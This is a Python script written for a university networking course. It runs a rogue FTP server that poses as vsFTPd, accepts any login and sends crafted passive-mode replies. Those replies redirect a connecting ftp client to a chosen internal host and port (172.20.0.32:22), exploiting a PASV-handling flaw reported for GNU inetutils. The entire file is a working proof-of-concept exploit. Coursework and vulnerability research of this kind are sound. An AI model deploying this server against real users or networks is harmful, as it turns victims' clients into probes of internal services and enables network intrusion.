#!/usr/bin/env python3

#------------------------------------------------------------------------------------------#
# Autores originais (11 Jun 2021):
#  - Zedd Yu Lu
# Autores da modificação (28 Jun 2022):
#  - David Tadokoro
#  - Fernando Henrique
#
# O código original, junto dos comentários do autor original, se encontram no link:
# https://lists.gnu.org/archive/html/bug-inetutils/2021-06/msg00002.html
#
# Esta implementação foi feita para o EP4 de MAC0352 (BCC IME-USP), ministrada no primeiro
# semestre de 2022, pelo professor Daniel Batista
#------------------------------------------------------------------------------------------#

import socketserver, threading, requests, subprocess, time, base64, secrets, sys, hashlib, os

class MyTCPHandler(socketserver.StreamRequestHandler):
   def handle(self):
       # IP:PORTA DO ALVO/CHUTE DO ATAQUE
       target = "172,20,0,32,0,22"

       print('[+] connected', self.request, file=sys.stderr)
       self.request.sendall(b'220 (vsFTPd 3.0.3)\r\n')

       self.data = self.rfile.readline().strip().decode()
       print(self.data, file=sys.stderr, flush=True)
       self.request.sendall(b'230 Login successful.\r\n')

       self.data = self.rfile.readline().strip().decode()
       print(self.data, file=sys.stderr)
       self.request.sendall(b'227 Entering Passive Mode (' + target.encode('utf-8') + b'\r\n')

       self.data = self.rfile.readline().strip().decode()
       print(self.data, file=sys.stderr)
       self.request.sendall(b'227 Entering Passive Mode (' + target.encode('utf-8') + b')\r\n')

       self.data = self.rfile.readline().strip().decode()
       print(self.data, file=sys.stderr)
       self.request.sendall(b'200 Switching to Binary mode.\r\n')

       exit()

def ftp_worker():
   with socketserver.TCPServer(('0.0.0.0', 21), MyTCPHandler) as server:
       while True:
           server.handle_request()

threading.Thread(target=ftp_worker).start()
time.sleep(2)
